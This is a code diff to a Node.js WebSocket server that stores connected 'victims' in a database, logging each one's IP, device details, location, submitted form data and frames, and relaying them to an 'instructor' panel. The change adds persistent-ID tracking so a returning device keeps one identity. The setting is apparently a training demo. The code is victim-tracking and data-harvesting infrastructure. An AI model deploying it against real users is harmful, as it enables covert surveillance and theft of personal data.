@@ -90,11 +90,17 @@ db.exec(`
   );
 `);
 
-const stmtUpsertVictim = db.prepare(`INSERT OR IGNORE INTO victims (client_id, session_id, ip, connected_at) VALUES (?, ?, ?, ?)`);
-const stmtUpdateDevice = db.prepare(`UPDATE victims SET device_json = ? WHERE client_id = ?`);
-const stmtUpdateLoc    = db.prepare(`UPDATE victims SET location_json = ? WHERE client_id = ?`);
-const stmtUpdateForm   = db.prepare(`UPDATE victims SET form_json = ? WHERE client_id = ?`);
-const stmtUpdateFrame  = db.prepare(`UPDATE victims SET last_frame_at = ? WHERE client_id = ?`);
+const stmtUpsertVictim  = db.prepare(`INSERT OR IGNORE INTO victims (client_id, session_id, ip, connected_at) VALUES (?, ?, ?, ?)`);
+const stmtUpdateDevice  = db.prepare(`UPDATE victims SET device_json = ? WHERE client_id = ?`);
+const stmtUpdateLoc     = db.prepare(`UPDATE victims SET location_json = ? WHERE client_id = ?`);
+const stmtUpdateForm    = db.prepare(`UPDATE victims SET form_json = ? WHERE client_id = ?`);
+const stmtUpdateFrame   = db.prepare(`UPDATE victims SET last_frame_at = ? WHERE client_id = ?`);
+// Remap a temp clientId row to the persistent ID coming from the browser
+const stmtRenameClient  = db.prepare(`UPDATE victims SET client_id = ? WHERE client_id = ?`);
+// Upsert by persistentId — ensures one DB row per real device even across reconnects
+const stmtUpsertByPid   = db.prepare(`INSERT INTO victims (client_id, session_id, ip, connected_at)
+  VALUES (?, ?, ?, ?)
+  ON CONFLICT(client_id) DO UPDATE SET ip = excluded.ip`);
 
 // ── REGISTRY & ROUTING ───────────────────────────────────────────────
 const instructorRooms = new Map();
@@ -186,10 +192,12 @@ let clientCounter = 0;
 
 wss.on('connection', (ws, req) => {
   const ip = (TRUST_PROXY && req.headers['x-forwarded-for']) ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
-  const clientId = `client_${Date.now()}_${++clientCounter}`;
+  // Start with a temp ID; replaced with the browser's persistentId on first device_info
+  let clientId = `client_${Date.now()}_${++clientCounter}`;
   let role = 'victim';
   let room = null;
   let lastFrameAt = 0;  // timestamp of last accepted frame from this client
+  let identityResolved = false; // true once persistentId has been applied
 
   victimSockets.add(ws);
   ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
@@ -239,6 +247,25 @@ wss.on('connection', (ws, req) => {
 
       // ── Telemetry Handling ───────────────────────────────────────────
       if (msg.type === 'device_info') {
+        // ── Persistent-ID deduplication ──────────────────────────────
+        // The browser sends a stable `persistentId` stored in sessionStorage.
+        // On first arrival we rename the temp row to that ID so all future
+        // messages (and instructor cards) are keyed to the same identity.
+        if (!identityResolved && msg.persistentId && typeof msg.persistentId === 'string') {
+          const pid = msg.persistentId.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
+          if (pid) {
+            // Try to upsert a row for the persistent ID (handles returning devices)
+            stmtUpsertByPid.run(pid, DEFAULT_SESSION, ip, ts());
+            // Rename the temp row → persistent ID (no-op if pid row already existed)
+            stmtRenameClient.run(pid, clientId);
+            const oldId = clientId;
+            clientId = pid;
+            identityResolved = true;
+            log(`[~] REMAP       ${oldId} → ${clientId}  IP=${ip}`);
+            // Tell the instructor panel to consolidate under the persistent ID
+            broadcastAll({ type: 'client_remap', oldId, newId: clientId });
+          }
+        }
         stmtUpdateDevice.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
       } else if (msg.type === 'location') {
